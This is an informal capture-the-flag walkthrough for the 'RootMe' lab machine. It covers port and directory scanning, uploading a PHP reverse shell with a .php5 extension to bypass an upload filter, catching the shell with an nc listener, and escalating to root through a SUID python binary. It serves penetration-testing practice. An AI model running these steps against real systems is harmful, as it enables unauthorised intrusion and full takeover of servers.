###### To Solve  ROOTME

1) run nmap scaning 

              [nmap -sC -sV IP] or [nmap -sC -sV -p- IP]

  ===> then we will fing thE:- opening ports
                               and apache version N more info about it

2) we need to use gobaster for bruit force directory scan
       
       [sudogobuster dir -u http://IP/ -w /usr/share/wordlists/dirb/common.t        xt] 

       * then we will find allot of directory like: - panel,
       and also 'panel is hiden direcctory = /panel/

 ==> next  we need to go back on brewser and :-
                  http://IP/panel/ Go---> Search

        BOOM! we found  'Select file and upload' page
    SOOO! now we need reverse shell , go head N SEARCH
        
        'https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-         reverse-shell.php'
    

    And then download it and modify your machine IP and port
    then ,  before you upload it 
     create lestiner tab to activate you shell
      
         [nc -lvp 1234]

  and then try to upload it if you find error just change directory and 
    modify "filename.php5"

    And after you uploaded the file 
     go to berowser and look for:-
                 =http://IP/panel/upload/

        then now click on php file you ave alredy uploaded,

        then check your  lestiner comman line,
    you will get into shell

  -----------------on shell

        [whoami]

        [ls]

        [find / -name user.txt]

        [cat /var/www/user.txt]

        [find / -user root -perm /4000 2>/dev/null]

= = =>weired file will be "/usr/bin/python" Answer
        
        [/usr/bin/./python -c 'import os;os.execl("/bin/sh","sh","-p")']


        [whoami]

        [cd root]

        [ls]
        
        [cat root.txt]

finaly you will find the last flag


DONE!
